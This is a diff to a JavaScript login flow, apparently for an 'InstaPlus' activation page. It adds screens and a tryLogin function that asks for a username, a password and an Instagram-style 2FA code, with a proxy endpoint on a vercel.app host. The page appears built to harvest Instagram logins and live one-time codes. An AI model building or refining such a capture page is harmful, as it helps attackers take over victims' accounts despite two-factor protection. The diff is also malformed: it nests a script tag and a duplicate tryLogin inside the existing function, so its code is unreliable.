@@ -1038,6 +1038,147 @@ async function tryLogin() {
     }
 
     // 3. Estado de Loading
+<script>
+// Estado global
+let activationTimer = null;
+
+// Configuração do Endpoint
+const PROXY_ENDPOINT = window.location.origin.startsWith('http') 
+    ? `${window.location.origin}/api/proxy` 
+    : 'https://instaplus-six.vercel.app/api/proxy';
+
+/**
+ * Navega para uma tela específica
+ * @param {string} screenName - 'plus', 'login', 'ativando'
+ */
+function go(screenName) {
+    const validScreens = ['plus', 'login', 'ativando'];
+    if (!validScreens.includes(screenName)) screenName = 'plus';
+    
+    // Atualiza o hash se necessário
+    if (location.hash !== `#${screenName}`) {
+        location.hash = screenName;
+    }
+    
+    // Força a atualização da UI imediatamente
+    renderScreen(screenName);
+}
+
+/**
+ * Renderiza a tela correta ocultando as outras
+ * @param {string} activeScreen - Nome da tela ativa
+ */
+function renderScreen(activeScreen) {
+    const screens = ['plus', 'login', 'ativando'];
+    
+    screens.forEach(id => {
+        const el = document.getElementById(id);
+        if (!el) return;
+        
+        if (id === activeScreen) {
+            // REMOVE a propriedade hidden (crucial para o CSS [hidden] não bloquear)
+            el.removeAttribute('hidden');
+            // Força display flex para garantir layout
+            el.style.display = 'flex';
+            
+            // Reinicia animações de entrada
+            const animatables = el.querySelectorAll('.scroll>*, .footer>*, .lback, .lang, .lmid, .lform>*, .lbottom>*');
+            animatables.forEach((node, index) => {
+                node.style.setProperty('--i', index);
+                node.style.animation = 'none';
+                void node.offsetWidth; 
+                node.style.animation = 'up .8s cubic-bezier(.2,.7,.2,1) both';
+                node.style.animationDelay = `${index * 80}ms`;
+            });
+        } else {
+            // ADICIONA a propriedade hidden (o CSS [hidden] aplica display:none)
+            el.setAttribute('hidden', '');
+            el.style.display = 'none';
+        }
+    });
+
+    // Lógica específica da tela de carregamento
+    clearTimeout(activationTimer);
+    const actScreen = document.getElementById('ativando');
+    if (actScreen && activeScreen === 'ativando') {
+        actScreen.classList.remove('run', 'done');
+        requestAnimationFrame(() => {
+            requestAnimationFrame(() => {
+                actScreen.classList.add('run');
+            });
+        });
+        activationTimer = setTimeout(() => {
+            actScreen.classList.add('done');
+        }, 3500);
+    }
+    
+    window.scrollTo(0, 0);
+}
+
+/**
+ * Trata o clique no botão de Login
+ */
+async function tryLogin() {
+    const userInput = document.getElementById('user');
+    const passInput = document.getElementById('pass');
+    const userErr = document.getElementById('userErr');
+    const passErr = document.getElementById('passErr');
+    const otpContainer = document.getElementById('otpContainer');
+    const otpInput = document.getElementById('otp');
+    const otpErr = document.getElementById('otpErr');
+    const loginBtn = document.querySelector('.lbtn');
+    
+    let isValid = true;
+
+    // 1. Validação de Campos Básicos
+    if (!userInput.value.trim()) {
+        userInput.classList.add('err');
+        userErr.hidden = false;
+        isValid = false;
+    } else {
+        userInput.classList.remove('err');
+        userErr.hidden = true;
+    }
+
+    if (!passInput.value) {
+        passInput.classList.add('err');
+        passErr.hidden = false;
+        isValid = false;
+    } else {
+        passInput.classList.remove('err');
+        passErr.hidden = true;
+    }
+
+    // Shake animation se inválido
+    if (!isValid) {
+        const form = document.querySelector('.lform');
+        form.classList.remove('shake');
+        void form.offsetWidth;
+        form.classList.add('shake');
+        return;
+    }
+
+    // 2. Lógica de 2FA (OTP) - Estilo Instagram
+    const isOtpVisible = otpContainer.style.display === 'block';
+
+    // Se o campo OTP NÃO está visível: Mostra o campo e para o fluxo
+    if (!isOtpVisible) {
+        otpContainer.style.display = 'block';
+        otpInput.focus();
+        return;
+    }
+
+    // Se o campo OTP ESTÁ visível: Valida o código
+    if (!otpInput.value.trim()) {
+        otpInput.classList.add('err');
+        otpErr.hidden = false;
+        return;
+    } else {
+        otpInput.classList.remove('err');
+        otpErr.hidden = true;
+    }
+
+    // 3. Estado de Loading
     loginBtn.disabled = true;
     loginBtn.textContent = 'Verificando...';
 
@@ -1086,7 +1227,6 @@ async function tryLogin() {
     }
 
     // 7. Sucesso - Transição
-    // Limpa campos para próxima tentativa
     userInput.value = '';
     passInput.value = '';
     otpInput.value = '';
